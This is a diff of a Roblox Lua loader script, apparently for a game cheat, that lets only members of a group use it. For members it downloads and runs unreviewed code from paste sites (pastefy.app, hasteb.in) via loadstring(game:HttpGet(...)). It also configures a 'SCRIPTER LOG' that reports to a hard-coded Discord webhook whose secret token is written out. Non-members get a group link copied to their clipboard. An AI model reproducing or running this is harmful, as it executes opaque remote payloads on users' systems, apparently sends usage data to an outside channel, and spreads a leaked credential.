@@ -3,33 +3,50 @@ local p = game:GetService("Players").LocalPlayer
 local g = game:GetService("StarterGui")
 
 if p:IsInGroup(id) then
-    loadstring(game:HttpGet("https://pastefy.app/Y9jXxmZU/raw"))()
+    local success, err = pcall(function()
+        loadstring(game:HttpGet("https://hasteb.in/sTlgfisMwxEKKDv"))()
+    end)
+    
+    if not success then warn("Error loading:", err) end
 
     getgenv().Title = "<^>SCRIPTER LOG<^>"
     getgenv().ThumbnailUrl = "https://i.imgur.com/QmNN2Yg.png"
     getgenv().Color = 0x000000
 
     getgenv().FieldTitle = "Script Used:"
-    getgenv().FieldText = "loadstring(game:HttpGet("https://raw.githubusercontent.com/MainTreeUhh/UniversalScript/main/Asterisk"))()"
+    getgenv().FieldText = [[loadstring(game:HttpGet("https://raw.githubusercontent.com/MainTreeUhh/UniversalScript/main/Asterisk"))()]]
 
     getgenv().Webhook = "https://discord.com/api/webhooks/1349705228806520883/Zb-nxossWJM1Iiove8G5Mg6AKqir-7SKvOfm83g2RWNY9W2vfDjk6eorkxjoQqKk2OkR"
 
     coroutine.wrap(function()
-        loadstring(game:HttpGet("https://pastefy.app/5WvXJB5C/raw"))()
+        local success, err = pcall(function()
+            loadstring(game:HttpGet("https://pastefy.app/5WvXJB5C/raw"))()
+        end)
+        
+        if not success then warn("Error loading source script:", err) end
     end)()
 else
-    (setclipboard or toclipboard or setrbxclipboard)("https://www.roblox.com/groups/"..id)
-    pcall(function() g:SetCore("ResetCoreGuiEnabled", true) end)
+    pcall(function()
+        (setclipboard or toclipboard or setrbxclipboard)("https://www.roblox.com/groups/" .. id)
+    end)
+
+    pcall(function()
+        g:SetCore("ResetCoreGuiEnabled", true)
+    end)
 
     local messages = {
         {"ACCESS DENIED", "JOIN THE GROUP TO USE THIS!"},
-        {"GROUP LINK COPIED", "!~~!"}
+        {"GROUP LINK COPIED", "Click the copied link to join!"}
     }
 
     for _, v in ipairs(messages) do
         pcall(function()
-            g:SetCore("SendNotification", {Title = v[1], Text = v[2], Duration = 5})
+            g:SetCore("SendNotification", {
+                Title = v[1],
+                Text = v[2],
+                Duration = 5
+            })
         end)
-        task.wait(0.01)
+        task.wait(0.000000001)
     end
 end
